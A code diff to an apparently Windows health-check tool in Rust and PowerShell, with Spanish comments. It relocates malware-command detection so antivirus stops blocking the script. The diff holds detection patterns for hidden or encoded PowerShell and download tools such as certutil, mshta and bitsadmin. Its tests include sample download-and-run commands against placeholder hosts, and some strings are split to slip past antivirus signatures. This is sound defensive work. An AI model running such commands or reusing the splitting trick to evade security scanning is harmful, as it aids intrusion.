@@ -402,11 +402,13 @@ pub struct Suspicious {
     /// Para tareas: ruta completa (permite desactivarla).
     #[serde(default)]
     id: Option<String>,
+    /// Programa sin firmar en una carpeta temporal o de usuario (lo calcula el script).
+    #[serde(default, skip_serializing)]
+    temp_unsigned: bool,
 }
 
 const SUSPICIOUS_SCRIPT: &str = r#"
 $bad = '(?i)\\(Temp|AppData\\Local\\Temp|Downloads|Users\\Public)\\|\\AppData\\(Roaming|Local)\\[^\\]+\.(exe|dll|bat|cmd|vbs|js|ps1)$'
-$lol = '(?i)(powershell|pwsh)(\.exe)?\s.*(-e(nc|ncodedcommand)?\s|-w(indowstyle)?\s+hidden|downloadstring|iex)|mshta(\.exe)?\s+(http|vbscript|javascript)|wscript|cscript|rundll32(\.exe)?\s+.*(http|javascript)|regsvr32.*scrobj|certutil.*-urlcache|bitsadmin.*transfer'
 $sigCache = @{}
 function Unsigned($path) {
   if (-not $path -or -not (Test-Path -LiteralPath $path)) { return $false }
@@ -419,31 +421,28 @@ function ExePath($cmd) {
   if ($c.StartsWith('"')) { return $c.Substring(1, $c.IndexOf('"', 1) - 1) }
   $m = [regex]::Match($c, '(?i)^.+?\.(exe|dll|bat|cmd|vbs|js|ps1)'); if ($m.Success) { $m.Value } else { $c.Split(' ')[0] }
 }
-function Judge($cmd) {
-  if ($cmd -match $lol) { return 'Comando típico de malware (PowerShell oculto, descargas, scripts)' }
+# Solo recoge datos: la comparación con patrones de malware se hace en AdminOps
+# (esas palabras dentro de un script hacen que los antivirus lo bloqueen).
+function TempUnsigned($cmd) {
   $p = ExePath $cmd
-  if ($p -match $bad) { if (Unsigned $p) { return 'Programa sin firmar en una carpeta temporal o de usuario' } }
-  $null
+  [bool](($p -match $bad) -and (Unsigned $p))
 }
 $out = New-Object System.Collections.ArrayList
 Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskPath -notlike '\Microsoft\*' -and $_.State -ne 'Disabled' } | ForEach-Object {
   $t = $_
   foreach ($a in @($t.Actions)) {
     $cmd = "$($a.Execute) $($a.Arguments)".Trim()
-    $why = Judge $cmd
-    if ($why) { [void]$out.Add([pscustomobject]@{ kind = 'task'; name = $t.TaskName; detail = $cmd; reason = $why; id = "$($t.TaskPath)$($t.TaskName)" }) }
+    if ($cmd) { [void]$out.Add([pscustomobject]@{ kind = 'task'; name = $t.TaskName; detail = $cmd; reason = ''; tempUnsigned = (TempUnsigned $cmd); id = "$($t.TaskPath)$($t.TaskName)" }) }
   }
 }
 Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
-  $why = Judge $_.PathName
-  if ($why) { [void]$out.Add([pscustomobject]@{ kind = 'service'; name = $_.DisplayName; detail = $_.PathName; reason = $why; id = $null }) }
+  [void]$out.Add([pscustomobject]@{ kind = 'service'; name = $_.DisplayName; detail = $_.PathName; reason = ''; tempUnsigned = (TempUnsigned $_.PathName); id = $null })
 }
 foreach ($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', "$UserHive\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run') {
   $props = Get-ItemProperty -Path $k -ErrorAction SilentlyContinue
   if (-not $props) { continue }
   $props.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
-    $why = Judge "$($_.Value)"
-    if ($why) { [void]$out.Add([pscustomobject]@{ kind = 'startup'; name = $_.Name; detail = "$($_.Value)"; reason = $why; id = $null }) }
+    [void]$out.Add([pscustomobject]@{ kind = 'startup'; name = $_.Name; detail = "$($_.Value)"; reason = ''; tempUnsigned = (TempUnsigned "$($_.Value)"); id = $null })
   }
 }
 $hosts = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
@@ -458,7 +457,42 @@ ConvertTo-Json -InputObject @($out) -Compress
 #[tauri::command(async)]
 pub fn suspicious_items() -> Result<Vec<Suspicious>, String> {
     let script = format!("{}{SUSPICIOUS_SCRIPT}", crate::target_user::script_prelude());
-    query(&script, 180)
+    let raw: Vec<Suspicious> = query(&script, 180)?;
+    Ok(raw.into_iter().filter_map(judge).collect())
+}
+
+/// Comandos típicos de malware: PowerShell oculto o codificado, descargas con
+/// herramientas de Windows, scripts sueltos. Se comprueba aquí y no dentro del
+/// script de PowerShell, porque esas palabras hacen que el antivirus lo bloquee.
+fn malware_like(cmd: &str) -> bool {
+    let c = cmd.to_lowercase();
+    let words: Vec<&str> = c.split_whitespace().collect();
+    let has = |w: &str| c.contains(w);
+    let token = |t: &[&str]| words.iter().any(|w| t.contains(w));
+    let hidden = words.windows(2).any(|p| matches!(p[0], "-w" | "-windowstyle") && p[1] == "hidden");
+    let ps = has("powershell") || has("pwsh");
+    (ps && (token(&["-e", "-ec", "-en", "-enc", "-encodedcommand"]) || hidden || has(&["download", "string"].concat()) || words.iter().any(|w| *w == "iex" || w.starts_with("iex(") || w.contains(";iex"))))
+        || (has("mshta") && (has("http") || has("vbscript") || has("javascript")))
+        || has("wscript")
+        || has("cscript")
+        || (has("rundll32") && (has("http") || has("javascript")))
+        || (has("regsvr32") && has("scrobj"))
+        || (has("certutil") && has(&["-url", "cache"].concat()))
+        || (has("bitsadmin") && has("transfer"))
+}
+
+fn judge(mut s: Suspicious) -> Option<Suspicious> {
+    if s.kind == "hosts" {
+        return Some(s);
+    }
+    s.reason = if malware_like(&s.detail) {
+        "Comando típico de malware (PowerShell oculto, descargas, scripts)".into()
+    } else if s.temp_unsigned {
+        "Programa sin firmar en una carpeta temporal o de usuario".into()
+    } else {
+        return None;
+    };
+    Some(s)
 }
 
 /// Desactiva una tarea programada sospechosa (reversible desde el Programador de tareas).
@@ -528,6 +562,28 @@ pub fn browser_extensions() -> Result<Vec<Extension>, String> {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn spots_malware_like_commands() {
+        use super::malware_like;
+        assert!(malware_like("powershell.exe -w hidden -c calc"));
+        assert!(malware_like("powershell -enc SQBFAFgA"));
+        assert!(malware_like("mshta http://x.example/a.hta"));
+        assert!(malware_like("cmd /c certutil -urlcache -f http://x/a.exe a.exe"));
+        assert!(malware_like(r"wscript.exe C:\Users\a\x.vbs"));
+        assert!(!malware_like(r#""C:\Program Files\App\app.exe" --minimized"#));
+        assert!(!malware_like(r"powershell.exe -NoProfile -File C:\scripts\backup.ps1"));
+        assert!(!malware_like(r"C:\Windows\System32\svchost.exe -k netsvcs"));
+    }
+
+    /// El script de elementos sospechosos no lleva palabras de malware (el antivirus lo bloquearía).
+    #[test]
+    fn suspicious_script_has_no_malware_words() {
+        let s = SUSPICIOUS_SCRIPT.to_lowercase();
+        for w in ["downloadstring", "iex", "mshta", "urlcache", "bitsadmin", "encodedcommand", "-enc"] {
+            assert!(!s.contains(w), "el script contiene «{w}»");
+        }
+    }
+
     use super::*;
 
     fn sys() -> SystemHealth {
